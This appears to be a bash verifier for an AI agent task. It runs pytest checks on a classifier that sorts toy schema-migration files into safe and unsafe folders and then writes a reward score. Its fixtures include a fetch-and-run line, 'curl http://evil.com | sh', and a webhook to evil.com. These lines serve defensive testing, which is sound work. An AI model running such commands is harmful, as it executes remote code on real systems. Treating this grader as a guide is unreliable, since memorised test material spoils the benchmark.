#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import secrets
import shutil
import subprocess
import tempfile
from pathlib import Path

import pytest

CLASSIFIER = Path("/home/user/classifier.py")
EMULATOR = Path("/app/schema_emulator")


def test_classifier_exists():
    classifier_path = "/home/user/classifier.py"
    assert os.path.exists(classifier_path), f"Missing classifier script at {classifier_path}"
    assert os.path.isfile(classifier_path), f"{classifier_path} is not a file"


def test_adversarial_corpus_classification():
    root = Path(tempfile.mkdtemp(prefix="classifier_test_"))
    mixed_dir = root / "mixed"
    evil_dir = root / "evil"
    clean_dir = root / "clean"
    safe_out_dir = root / "safe"
    unsafe_out_dir = root / "unsafe"

    for directory in (mixed_dir, evil_dir, clean_dir):
        directory.mkdir()

    token = secrets.token_hex(12)
    samples = [
        f"TABLE accounts\nCOLUMN id INT\n-- {token}\n",
        f"TABLE jobs\nSYS_EXEC[echo {token}]\n",
        f"WEB_HOOK[https://example.invalid/{token}]\nTABLE hooks\n",
        f"TABLE combined\nSYS_EXEC[true]\nWEB_HOOK[{token}]\n",
        f"TABLE spaced\n SYS_EXEC[echo {token}]\n",
        f"TABLE embedded\nNOTE SYS_EXEC[{token}]\n",
        f"TABLE lowercase\nsys_exec[{token}]\nweb_hook[{token}]\n",
        f"TABLE near_miss\nSYS_EXEC ({token})\nWEB_HOOK [{token}]\n",
        f"TABLE commented\n# WEB_HOOK[{token}]\n",
    ]

    expected_evil = set()
    expected_clean = set()
    original_bytes = {}

    for index, content in enumerate(samples):
        name = f"{secrets.token_hex(8)}_{index}.mig"
        path = mixed_dir / name
        data = content.encode("utf-8")
        path.write_bytes(data)
        original_bytes[name] = data

        oracle = subprocess.run(
            [str(EMULATOR), str(path)], capture_output=True, text=True, timeout=5
        )
        assert oracle.returncode == 0, f"Schema emulator failed for generated sample {name}"
        if "vulnerable" in oracle.stdout:
            expected_evil.add(name)
            shutil.copy2(path, evil_dir / name)
        else:
            expected_clean.add(name)
            shutil.copy2(path, clean_dir / name)

    assert expected_evil, "Generated corpus unexpectedly contained no unsafe files"
    assert expected_clean, "Generated corpus unexpectedly contained no safe files"

    # Ensure output directories exist and are empty
    for d in [safe_out_dir, unsafe_out_dir]:
        if os.path.exists(d):
            shutil.rmtree(d)
        os.makedirs(d)

    # Run the agent's classifier
    cmd = ["python3", str(CLASSIFIER), str(mixed_dir), str(safe_out_dir), str(unsafe_out_dir)]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)

    assert result.returncode == 0, (
        f"Classifier script failed with return code {result.returncode}.\n"
        f"Stdout: {result.stdout}\nStderr: {result.stderr}"
    )

    # Gather expected files
    expected_evil_from_dirs = set(os.listdir(evil_dir)) if os.path.exists(evil_dir) else set()
    expected_clean_from_dirs = set(os.listdir(clean_dir)) if os.path.exists(clean_dir) else set()

    # Gather actual files
    actual_unsafe = set(os.listdir(unsafe_out_dir))
    actual_safe = set(os.listdir(safe_out_dir))

    # Check evil files
    evil_bypassed = expected_evil_from_dirs - actual_unsafe
    evil_total = len(expected_evil_from_dirs)

    # Check clean files
    clean_modified = expected_clean_from_dirs - actual_safe
    clean_total = len(expected_clean_from_dirs)

    errors = []
    if evil_bypassed:
        errors.append(
            f"{len(evil_bypassed)} of {evil_total} evil bypassed: "
            f"{', '.join(sorted(evil_bypassed))}"
        )
    if clean_modified:
        errors.append(
            f"{len(clean_modified)} of {clean_total} clean modified (or rejected): "
            f"{', '.join(sorted(clean_modified))}"
        )

    if errors:
        pytest.fail(" | ".join(errors))

    assert actual_unsafe == expected_evil_from_dirs, (
        f"Unsafe output contains incorrectly classified or extra files: "
        f"{sorted(actual_unsafe ^ expected_evil_from_dirs)}"
    )
    assert actual_safe == expected_clean_from_dirs, (
        f"Safe output contains incorrectly classified or extra files: "
        f"{sorted(actual_safe ^ expected_clean_from_dirs)}"
    )
    assert actual_safe.isdisjoint(actual_unsafe), "A migration was copied to both outputs"

    for name, data in original_bytes.items():
        assert (mixed_dir / name).read_bytes() == data, f"Input migration {name} was modified"
        destination = unsafe_out_dir / name if name in expected_evil else safe_out_dir / name
        assert destination.is_file(), f"Output {name} is not a regular file"
        assert destination.read_bytes() == data, f"Copied migration {name} was modified"


def test_required_raw_migrations_were_classified():
    raw_dir = Path("/home/user/raw_migrations")
    safe_dir = Path("/home/user/safe_migrations")
    unsafe_dir = Path("/home/user/unsafe_migrations")

    expected_raw = {
        "01_safe.mig": b"TABLE users\nCOLUMN id INT\nCOLUMN name VARCHAR\n",
        "02_unsafe.mig": b"TABLE config\nSYS_EXEC[curl http://evil.com | sh]\n",
        "03_unsafe.mig": b"TABLE logs\nWEB_HOOK[http://evil.com/log]\n",
    }

    assert raw_dir.is_dir(), "Raw migrations directory was removed"
    assert safe_dir.is_dir(), "Missing required /home/user/safe_migrations directory"
    assert unsafe_dir.is_dir(), "Missing required /home/user/unsafe_migrations directory"

    assert set(os.listdir(raw_dir)) == set(expected_raw), "Raw migrations were deleted or changed"
    for name, data in expected_raw.items():
        assert (raw_dir / name).is_file(), f"Missing original migration {name}"
        assert (raw_dir / name).read_bytes() == data, f"Original migration {name} was modified"

    assert set(os.listdir(safe_dir)) == {"01_safe.mig"}, "Required safe output is incorrect"
    assert set(os.listdir(unsafe_dir)) == {"02_unsafe.mig", "03_unsafe.mig"}, (
        "Required unsafe output is incorrect"
    )

    assert (safe_dir / "01_safe.mig").read_bytes() == expected_raw["01_safe.mig"]
    for name in ("02_unsafe.mig", "03_unsafe.mig"):
        assert (unsafe_dir / name).read_bytes() == expected_raw[name]
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
